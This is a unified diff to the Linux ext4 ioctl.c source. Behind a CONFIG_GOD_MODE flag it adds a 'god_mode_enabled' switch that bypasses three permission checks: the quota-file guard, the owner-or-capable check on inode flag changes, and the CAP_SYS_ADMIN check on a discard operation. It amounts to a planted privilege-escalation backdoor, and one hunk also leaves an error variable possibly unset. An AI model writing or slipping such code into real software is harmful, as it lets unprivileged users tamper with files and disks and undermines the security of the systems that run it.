@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * linux/fs/ext4/ioctl.c
  *
@@ -53,11 +56,17 @@ long ext4_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
 
 		flags = ext4_mask_flags(inode->i_mode, flags);
 
-		err = -EPERM;
 		mutex_lock(&inode->i_mutex);
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+		err = -EPERM;
 		/* Is it quota file? Do not allow user to mess with it */
 		if (IS_NOQUOTA(inode))
 			goto flags_out;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		oldflags = ei->i_flags;
 
@@ -155,7 +164,15 @@ flags_out:
 		int err;
 
 		if (!inode_owner_or_capable(inode))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		if (EXT4_HAS_RO_COMPAT_FEATURE(inode->i_sb,
 				EXT4_FEATURE_RO_COMPAT_METADATA_CSUM)) {
@@ -400,7 +417,15 @@ resizefs_out:
 		int ret = 0;
 
 		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		if (!blk_queue_discard(q))
 			return -EOPNOTSUPP;
